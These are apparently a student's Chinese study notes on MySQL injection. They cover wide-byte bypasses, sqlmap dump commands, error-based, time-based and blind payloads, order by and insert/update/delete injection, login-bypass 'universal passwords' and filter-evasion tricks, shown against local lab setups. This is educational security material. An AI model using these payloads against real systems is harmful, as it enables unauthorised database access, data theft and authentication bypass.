# 安全牛SQL注入学习笔记

<div class="has-toc have-toc">
</div>

## 0x00 宽字节注入

宽字节注入用于绕过<a rel="noreferrer noopener" href="https://www.php.net/manual/zh/function.addslashes.php" data-type="URL" data-id="https://www.php.net/manual/zh/function.addslashes.php" target="_blank" rel="nofollow" >addslashes</a>函数，常见的URL转码有：空格`%20`，'`%27`，#`%23`，\`%5c`。

逃逸方法：1、\前面再加一个\；2、mysql使用GBK编码的特性，  
会认为两个字符是一个汉字（前一个ascii码>128）

sqlmap的使用小记。<figure class="wp-block-image size-large is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/14955756502958802442.jpg" alt="" class="wp-image-1931" width="577" height="241" /> </figure> 

判断是否存在注入点`sqlmap -u url`，例如`sqlmap -u http://127.0.0.1/sqli-labs/Less-1/?id=1`，id参数大于两个时，记得把url用双引号引起来  
`sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1&uid=1"`

查询所有库名`sqlmap -u&nbsp;url&nbsp;- -dbs`

查询库中的所有表名`sqlmap -u&nbsp;url -D 库名 - -tables`

查询表中的字段  
`sqlmap -u url -D 库名 -T 表名 - -columns`

查询字段内容  
`sqlmap -u url -D <code>库名 -T 表名` -C 字段1，字段2.... - -dump</code>

配合16进制时，加上`--hex`

## 0x01 基于约束的SQL攻击

假设mysql中的某张表将用户名限制为10个字符以内，限制了插入的字符串的长度，如果插入一条的用户名为`'admin                                     1'`的数据，超出的部分会被数据库忽略掉，多出的部分被截断，新创建的admin用户对应我们而言就是可控的了。

## 0x02 报错注入

报错注入在于：`count(*)`,`rand()`,`floor()`以及`group by`。`rand()`用于产生一个0~1的随机数。`count(*)`统计整个的结果，`floor()`向下取整。`rand()`函数生成0~1的函数，使用`floor()`函数向下取整，值是固定的“0”，我们将rand*2，得到的值就是不固定的，“0”或者“1”。`group by`语句用于结合聚合函数，根据一个或多个列对结果集进行分组。

公式：`and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tablesgroup by x)a);`

语句执行的时候会建立一个虚拟表，整个工作流程大致如下。开始查询数据时，读取数据库数据，查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加。<figure class="wp-block-image size-large">

<img loading="lazy" width="851" height="261" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/image-9.png" alt="" class="wp-image-1945" /></figure> 

查询前默认会建立空虚拟表，取第1条记录，执行floor(rand(0)\*2)，发现结果为0(第1次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)\*2)会被再计算一次，结果为1(第2次计算)，插入虚表<figure class="wp-block-image size-large">

<img loading="lazy" width="519" height="361" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/image-10.png" alt="" class="wp-image-1947" /> </figure> 

查询第2条记录，再次计算floor(rand(0)\*2)，发现结果为1(第3次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)\*2)不会被计算第2次，直接count(*)+1<figure class="wp-block-image size-large">

<img loading="lazy" width="513" height="335" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/image-11.png" alt="" class="wp-image-1948" /> </figure> 

查询第3条记录，再次计算floor(rand(0)\*2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)\*2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以重复插入报错。<figure class="wp-block-image size-large">

<img loading="lazy" width="514" height="372" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/image-13.png" alt="" class="wp-image-1955" /></figure> 

updatexml函数：`or updatexml(1,concat(0x7e,(<code>操作代码`)),0)</code>updatexml第二个参数需要的是Xpath格式的字符串。输入不符合，报错，但`version()`函数能够正常的执行。updatexml的最大长度是32位。

extractvalue函数：`and extractvalue(1, concat(0x7e, (select <code>操作代码`)))</code> extractvalue原理与updatexml类似。

exp函数：`and exp(~(select * from(select <code>操作代码`)a))</code> exp()数学函数，用于计算e的x次方的函数。但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值，从而实现了报错注入。

NAME_CONST函数：`select * from (select NAME_CONST(version(),1),NAME_CONST(<code><code>version()`</code>,1))a;</code>mysql列名重复会导致报错，存在局限性，爆不了库等。

GeometryCollection函数：`and geometrycollection((select * from(select * from (操作代码)a)b))`GeometryCollection是由1个或多个任意类几何对象构成的几何对象。官方文档中举例的用法如下：`GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))`POINT(x,y) 函数,这是坐标函数，相当于X,Y坐标图上的一点。LINESTRING(x y,x y)函数,这个函数用来描述直线,两点连成的直线。mysql无法画出图形，报错。

空间数据储存函数：POLYGON:简单面`polygon ()`、MULTIPOINT：多点`multipoint ()`、MULITILINESTRING:多线`multlinestring ()`、MUILITIPOLYGON：多面`multpolygon ()`、LINESTRING:简单线`linestring ()`报错原理与GeometryCollection()原理相同。

join函数：`and（select * from (select * from 表名 a join 表名 b using(已知的字段1，已知的字段2,……)c))`在表名已知的前提下才能操作。参考：<a href="https://blog.csdn.net/weixin_46706771/article/details/112769113" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://blog.csdn.net/weixin_46706771/article/details/112769113</a>

bigint函数：参考<a rel="noreferrer noopener" href="https://www.cnblogs.com/lcamry/articles/5509112.html" target="_blank" rel="nofollow" >https://www.cnblogs.com/lcamry/articles/5509112.html</a>

## 0x03 基于时间的盲注以及bool型的盲注

sleep(duration )函数使用说明：睡眠( 暂停) 时间为duration 参数给定的秒数，然后返回0 。若sleep() 被中断, 它会返回1。

假设表中有四条数据，id从1-4，select \* from table where id=1 or sleep(1);会延时9s，select \* from table where id=5 and sleep(1);会延时12s。

配合if条件触发，`IF(expr1,expr2,expr3)`如果expr1 是TRUE (expr1 <> 0 and expr1 <> NULL)，则IF()的返回值为expr2; 否则返回值则为expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。

截取函数

| 函数                                  | 作用                                                         |
| ------------------------------------- | ------------------------------------------------------------ |
| MID(s,n,len)                          | 从字符串 s 的 n 位置截取长度为 len 的子字符串                |
| RIGHT(s,n)                            | 返回字符串 s 的后 n 个字符                                   |
| LEFT(s,n)                             | 返回字符串 s 的前 n 个字符                                   |
| SUBSTR(s, start, length)              | 从字符串 s 的 start 位置截取长度为 length 的子字符串         |
| SUBSTRING(s, start, length)           | 从字符串 s 的 start 位置截取长度为 length 的子字符串         |
| SUBSTRING_INDEX(s, delimiter, number) | 返回从字符串 s 的第 number 个出现的分隔符 delimiter 之后的子串。 如果 number 是正数，返回第 number 个字符左边的字符串。 如果 number 是负数，返回第(number 的绝对值(从右边数))个字符右边的字符串。 |

SUBSTRING 的其他用法：SUBSTRING(str,pos) , SUBSTRING(str FROM pos)，SUBSTRING(str FROM pos FOR len)，后两种可以绕过,的过滤。SUBSTR和MID也支持这种用法。

RLIKE、REGEXP执行字符串表达式与模式的模式匹配。语法：`RLIKE&nbsp;Pat_for_match`这里Pat\_for\_match是要与表达式匹配的模式。

like 匹配注入。

配合select case when条件触发，SQL CASE 表达式是一种通用的条件表达式，类似于其它语言中的if/else 语句。

<pre class="wp-block-code"><code>CASE WHEN conditionTHEN result&lt;br>&#91;WHEN ...]&lt;br>&#91;ELSE result]&lt;br>END</code></pre>

例句：`select case when username='admin' THEN 'aaa' ELSE (sleep(3) ) end<br>from user;`

逐字注入，能够截取字符，同时能触发延时即可。结合python的request库写脚本。  
例句1：`Select * from table where id = 1 and (if(substr(database(),1,1)=’’,sleep(4),null))`  
例句2：`Select * from table where id = 1 and (if(ascii(substr(database(),1,1))<128,sleep(4),null))`

除了sleep之外的延时有以下4种：

BENCHMARK(count ,expr )，BENCHMARK() 函数重复count 次执行表达式expr 。它可以被用于计算MySQL 处理表达式的速度。结果值通常为0 。例句：`select benchmark(10000000,sha(1));`

笛卡尔积，AxB=A和B中每个元素的组合所组成的集合，就是连接表。例句：`SELECT count(*) FROM information_schema.columnsA,information_schema.columnsB, information_schema.tablesC;`

GET_LOCK(str,timeout )，设法使用字符串str给定的名字得到一个锁，超时为timeout 秒。条件限制：需要两个session。例句：session A `select get_lock('test',1);`session B `select get_lock('test',5);`

RLIKE REGEXP正则匹配，通过`rpad`或`repeat`构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。RPAD(str,len,padstr) 用字符串 padstr对 str进行右边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len'，那么它将被截除到 len个字符。范例：`SELECT RPAD('hi',5,'?'); -> 'hi???'`repeat(str,times) 复制字符串times次。

例句：`select concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE'(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'`

ORD()函数和ASCII()函数，返回第一个字符的ASCII码。

## 0x04 order by的注入

位运算符<figure class="wp-block-image size-full">

<img loading="lazy" width="1101" height="446" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image.png" alt="" class="wp-image-2053" /> </figure> 

ORDER BY子句对查询返回的结果按一列或多列排序。  
语法格式为：`ORDER BY {column_name[ASC|DESC]} [，...n]`  
ORDER BY 语句默认按照升序对记录进行排序。

在不知道列名的情况下可以通过列的的序号来指代相应的列。但是经过测试这里无法做运算，如order=3-1和order=2是不一样的。

当orderby注入能过返回错误信息时，也可以考虑使用报错注入。

根据不同的列排序，会返回不同的结果，使用类似于bool型盲注的形式来注入，即使判断的结果与某种返回内容相关联，来实现注入，同理，在bool型注入可以的情况下，一般也能使用基于时间的盲注。

Orderby可以根据多列排序，因此注入的语句不一定限制与orderby的第一个参数，也可以通过逗号去对新的列进行注入。

## 0x05 insert，update和delete注入


Insert注入

例句1：`insert into users (id, username, password) values (1,’user’,’passwd’);`

例句2：`insert into users (id, username, password)values (2, 'attacker' or updatexml(1,concat(0x7e,database()),0), ’passwd’);<br>`例句3：`insert into users (id, username, password) values (3,database(),’passwd');` `<br>`

Update注入

例句1：`update users set password = ‘password’ where id =2;`

例句2：`update users set password=’password' or updatexml(1,concat(0x7e,database()),0) WHERE id=2;`

Delete注入

例句1：`delete from users where id=2;`

例句2：`delete from users where id=2 or updatexml(1,concat(0x7e,database()),0);`

## 0x06 desc相关注入及其他

`{DESCRIBE | DESC} tbl_name[col_name| wild]`  
DESCRIBE 或DESC查看表结构的详细信息。col\_name可以是一个列名或是一个包含SQL 通配符字符“%” 和“\_” 的字符串。

\`&nbsp;是&nbsp;MySQL&nbsp;的转义符，避免和 mysql 的本身的关键字冲突，只要你不在列名、表名中使用&nbsp;mysql&nbsp;的保留字或中文，就不需要转义。通常用来说明其中的内容是**数据库名、表名、字段名**，不是关键字。

万能密码

`Select * from admin where username = 'admin'#`

`Select * from admin where username =  ''+'' and password = ''+'';`仅限于0开头的字符串。

`Select * from admin where username =  'aaa'='' and password = 'aaa'=''`; 

\N,E0，.0绕过其实相当于NULL字符，参考：<a href="https://blog.csdn.net/wy_97/article/details/78085664" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://blog.csdn.net/wy_97/article/details/78085664</a>

<pre class="wp-block-code"><code>mysql&gt; select*from sql_test where id =\Nunion select * from sql_test where id=2;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 2 | test | 234 |
+----+----------+----------+
1 row in set (0.00 sec)

mysql&gt; select*from sql_test where id =8E0union select * from sql_test where id=2;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  2 | test     | 234      |
+----+----------+----------+
1 row in set (0.00 sec)

mysql&gt; select*from sql_test where id =8.0union select * from sql_test where id=2;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  2 | test     | 234      |
+----+----------+----------+
1 row in set (0.06 sec)
————————————————</code></pre>
